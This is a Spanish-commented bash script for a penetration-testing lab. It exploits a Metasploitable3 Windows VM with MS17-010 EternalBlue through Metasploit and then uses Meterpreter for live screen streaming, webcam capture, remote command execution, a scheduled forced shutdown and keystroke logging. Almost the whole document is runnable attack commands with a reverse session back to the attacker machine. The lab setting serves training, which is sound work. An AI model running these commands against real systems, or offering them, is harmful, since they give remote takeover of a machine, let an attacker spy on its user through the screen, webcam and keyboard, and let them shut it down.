#!/bin/bash
# =============================================================
#  LABORATORIO DE SEGURIDAD INFORMÁTICA - METERPRETER
#  Atacante : Kali Linux        (192.168.56.103)
#  Víctima  : Windows 2008 R2  (192.168.56.104) - Metasploitable3
#  Exploit  : MS17-010 EternalBlue
# =============================================================
#
#  ÍNDICE DE ATAQUES:
#    1. Video streaming (screenshare)
#    2. Abrir la cámara (webcam)
#    3. Ejecutar CMD desde Kali (shell / execute)
#    4. Script: captura + apagado programado
#    5. Capturar teclado en .txt (keylogger)
#
#  USO: Este script sirve como REFERENCIA y DOCUMENTACIÓN.
#       Los bloques marcados con [MSFCONSOLE] se ejecutan
#       dentro de msfconsole, no en la terminal directa.
# =============================================================

# ─────────────────────────────────────────────────────────────
#  VARIABLES DEL LAB
# ─────────────────────────────────────────────────────────────
RHOST="192.168.56.104"   # IP víctima (Windows)
LHOST="192.168.56.103"   # IP atacante (Kali)
LPORT="444"              # Puerto de escucha
SESSION="<ID>"           # Reemplazar con el número real de sesión

# ─────────────────────────────────────────────────────────────
#  FASE 0 — RECONOCIMIENTO (desde terminal Kali)
# ─────────────────────────────────────────────────────────────

echo "[*] Verificando conectividad..."
ping -c 4 $RHOST

echo "[*] Escaneo rápido de puertos..."
sudo nmap -sS $RHOST

echo "[*] Escaneo con detección de versiones..."
sudo nmap -sV $RHOST

# ─────────────────────────────────────────────────────────────
#  FASE 1 — EXPLOTACIÓN (ejecutar msfconsole)
# ─────────────────────────────────────────────────────────────
# Iniciar base de datos de Metasploit
sudo msfdb init

# Lanzar msfconsole y explotar automáticamente
msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $RHOST;
set LHOST $LHOST;
set LPORT $LPORT;
run;
"

# ─────────────────────────────────────────────────────────────
#  COMANDOS COMUNES DE METERPRETER (referencia)
# ─────────────────────────────────────────────────────────────
# [MSFCONSOLE] Ver sesiones activas
#   sessions -l
#
# [MSFCONSOLE] Interactuar con una sesión
#   sessions -i <ID>
#
# [MSFCONSOLE] Mandar sesión al fondo sin cerrarla
#   background
#
# [MSFCONSOLE] Cerrar una sesión duplicada
#   sessions -k <ID>
#
# [MSFCONSOLE] Información del sistema víctima
#   sysinfo
#   getuid
#   getprivs
#
# [MSFCONSOLE] Migrar a proceso estable (explorer.exe)
#   ps                         <- listar procesos, buscar explorer.exe
#   migrate <PID_de_explorer>  <- mejorar estabilidad y acceso a UI

# ─────────────────────────────────────────────────────────────
#  ATAQUE 1 — VIDEO STREAMING (screenshare)
# ─────────────────────────────────────────────────────────────
# Requiere estar dentro de meterpreter con sesión activa.
# IMPORTANTE: migrar a explorer.exe antes para ver el escritorio.
#
# [MSFCONSOLE - meterpreter]
#   migrate <PID_explorer>   <- ej: migrate 4568
#   screenshare              <- abre un .html en Kali con stream en vivo
#                               archivo guardado en: /home/kali/*.html
#   Ctrl+C                   <- detener el stream
#
# También: captura estática de pantalla
#   screenshot               <- guarda .jpeg en /home/kali/
#   screenshot -p /home/kali/captura_$(date +%H%M%S).png  <- nombre personalizado

# ─────────────────────────────────────────────────────────────
#  ATAQUE 2 — ABRIR LA CÁMARA (webcam)
# ─────────────────────────────────────────────────────────────
# [MSFCONSOLE - meterpreter]
#   webcam_list              <- listar cámaras disponibles
#   webcam_snap              <- tomar foto con la cámara
#   webcam_stream            <- stream de video en vivo
#                               (abre un .html en Kali)
#
# NOTA: Metasploitable3 (VM) no tiene cámara física.
#       En un equipo real con webcam estos comandos funcionan.
#       Resultado esperado en VM:
#         [-] Target does not have a webcam
#         [-] No webcams were found

# ─────────────────────────────────────────────────────────────
#  ATAQUE 3 — EJECUTAR CMD DESDE KALI
# ─────────────────────────────────────────────────────────────
# Método A: Shell interactivo completo
# [MSFCONSOLE - meterpreter]
#   shell                          <- abre cmd.exe de Windows
#   ipconfig                       <- comando dentro del cmd
#   time /t                        <- ver hora del sistema víctima
#   whoami                         <- usuario actual
#   exit                           <- volver a meterpreter

# Método B: Ejecutar comando y capturar la salida (-o)
# [MSFCONSOLE - meterpreter]
#   execute -f cmd.exe -a "/c ipconfig" -o
#   execute -f cmd.exe -a "/c time /t" -o
#   execute -f cmd.exe -a "/c schtasks /query /fo LIST" -o
#   execute -f powershell.exe -a "-ExecutionPolicy Bypass -Command Get-Date" -o

# ─────────────────────────────────────────────────────────────
#  ATAQUE 4 — SCRIPT: CAPTURA + APAGADO PROGRAMADO
# ─────────────────────────────────────────────────────────────

# PASO A: Crear el script de apagado programado en Kali
# Ajusta el tiempo en segundos según la diferencia entre
# la hora actual del Windows y la hora objetivo de apagado.
# Ejemplo: hora Windows = 17:26 → hora objetivo = 17:31 → 300 segundos

SEGUNDOS_ESPERA=300   # Cambiar según la diferencia calculada
HORA_OBJETIVO="17:31" # Solo referencia visual, no se usa en el script

cat > /home/kali/apagado_programado.rc << 'EOF'
# Captura inicial (evidencia ANTES del apagado)
screenshot

# Espera usando el timeout del propio Windows (no duerme meterpreter)
shell
timeout /t 300 /nobreak
exit

# Captura final (evidencia JUSTO ANTES del apagado)
screenshot

# Apagar el equipo víctima
shell
shutdown /s /t 0
exit
EOF

echo "[+] Script apagado_programado.rc creado en /home/kali/"

# PASO B: Alternativa con schtasks (más robusta, no depende de la sesión)
# [MSFCONSOLE - meterpreter]
#   screenshot -p /home/kali/captura_preapagado.png
#   execute -f cmd.exe -a "/c schtasks /create /tn \"Apagado\" /tr \"shutdown /s /t 0\" /sc once /st 17:31 /f" -o
#   execute -f cmd.exe -a "/c schtasks /query /tn \"Apagado\" /fo LIST" -o
#   execute -f cmd.exe -a "/c time /t" -o   <- verificar hora actual del Windows

# PASO C: Ejecutar el resource script sobre la sesión activa
# [MSFCONSOLE]
#   sessions -l                                    <- ver ID de la sesión
#   sessions -i <ID> -s apagado_programado.rc      <- lanzar el script
#
# Si da error, alternativa:
#   sessions -i <ID>
#   resource /home/kali/apagado_programado.rc

# PASO D: Verificar capturas guardadas después del apagado
ls -lt /home/kali/*.jpeg /home/kali/*.png 2>/dev/null | head -10
echo "[*] Capturas guardadas en /home/kali/"

# ─────────────────────────────────────────────────────────────
#  ATAQUE 5 — CAPTURAR TECLADO EN .TXT (keylogger)
# ─────────────────────────────────────────────────────────────

# IMPORTANTE: Migrar a explorer.exe ANTES de iniciar el keylogger
# para capturar las teclas del usuario activo en el escritorio.
# [MSFCONSOLE - meterpreter]
#   ps                        <- buscar PID de explorer.exe
#   migrate <PID_explorer>    <- ej: migrate 4568

# Método A: Keyscan manual (más simple)
# [MSFCONSOLE - meterpreter]
#   keyscan_start             <- iniciar captura de teclas
#   keyscan_dump              <- ver teclas capturadas hasta ahora
#   keyscan_dump              <- repetir para ver nuevas teclas
#   keyscan_stop              <- detener captura

# Método B: Keylog recorder automático (guarda en archivo .txt)
# [MSFCONSOLE - meterpreter]
#   run post/windows/capture/keylog_recorder
#   <- las teclas se guardan automáticamente en:
#      /home/kali/.msf4/loot/<timestamp>_host.windows.key_<id>.txt
#   Ctrl+C                    <- detener la grabación

# Ver el archivo de keylog generado
ls -lt /home/kali/.msf4/loot/*.txt 2>/dev/null | head -5

# Activar spool para guardar TODO lo que aparece en msfconsole
# [MSFCONSOLE]
#   spool /home/kali/keylog_evidencia.txt    <- iniciar grabación de consola
#   spool off                                <- detener grabación

# ─────────────────────────────────────────────────────────────
#  RESUMEN DE ARCHIVOS GENERADOS (evidencias)
# ─────────────────────────────────────────────────────────────
echo ""
echo "=========================================="
echo "  EVIDENCIAS GENERADAS EN /home/kali/"
echo "=========================================="
echo ""
echo "  Capturas de pantalla (.jpeg / .png):"
ls /home/kali/*.jpeg /home/kali/*.png 2>/dev/null

echo ""
echo "  Stream de video (.html):"
ls /home/kali/*.html 2>/dev/null

echo ""
echo "  Logs de teclado (.txt):"
ls /home/kali/.msf4/loot/*.txt 2>/dev/null

echo ""
echo "  Spool de consola:"
ls /home/kali/keylog_evidencia.txt 2>/dev/null

echo ""
echo "=========================================="
echo "  FIN DEL LABORATORIO"
echo "=========================================="
